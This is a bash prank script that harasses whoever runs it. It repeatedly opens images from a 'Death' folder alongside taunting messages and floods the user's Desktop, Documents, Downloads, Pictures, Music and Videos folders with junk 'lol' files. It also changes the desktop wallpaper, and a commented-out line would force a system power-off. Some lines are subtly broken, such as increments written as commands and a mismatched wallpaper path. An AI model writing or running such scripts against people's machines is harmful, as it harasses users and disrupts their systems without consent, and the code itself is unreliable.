a="\0033[7m"
b="\0033[0m"
c="\0033[1;37;41m"
d="\0033[1;37;42m"
e="\0033[1;37;44m"

i=0

r=0
l=1
cp ~/Documents/Death/happy.jpg /tmp


sleep 10s
until [ $r -gt 20 ]
do
	echo -e "$a Your Welcome"
	echo -e "$b You should be happy about this"
	echo -e "$c Are you having fun?"
	xdg-open ~/Documents/Death/roll.gif
	sleep 500ms
	xdg-open ~/Documents/Death/welcome.jpg
		sleep .5s
	xdg-open ~/Documents/Death/are.jpg
		sleep .5s
	xdg-open ~/Documents/Death/did.jpg
		sleep .5s
	xdg-open ~/Documents/Death/fault.jpg
		sleep .5s
	$((r++))
	$((r++))
	$((l++))
	$((l++))
	echo $r
	touch ~/Desktop/lol$r.txt
	touch ~/Desktop/lol$l.txt
	touch ~/Downloads/lol$r.txt
	touch ~/Downloads/lol$l.txt
	touch ~/Documents/lol$r.txt
	touch ~/Documents/lol$l.txt
	touch ~/Pictures/lol$r.txt
	touch ~/Pictures/lol$l.txt
	touch ~/Music/lol$r.txt
	touch ~/Music/lol$l.txt
	touch ~/Videos/lol$r.txt
	touch ~/Videos/lol$l.txt
	touch ~/Home/lol$r.txt
	touch ~/Home/lol$l.txt
done


echo -e "$d Its ok, you can scream now"
sleep 10s
xdg-open ~/Documents/Death/happy.jpg
sleep 10s
gsettings set org.gnome.desktop.background picture-uri 'file:~/tmp/happy.jpg'

#for death
#dbus-send --system --print-reply --dest=org.freedesktop.login1 /org/freedesktop/login1 "org.freedesktop.login1.Manager.PowerOff" boolean:true
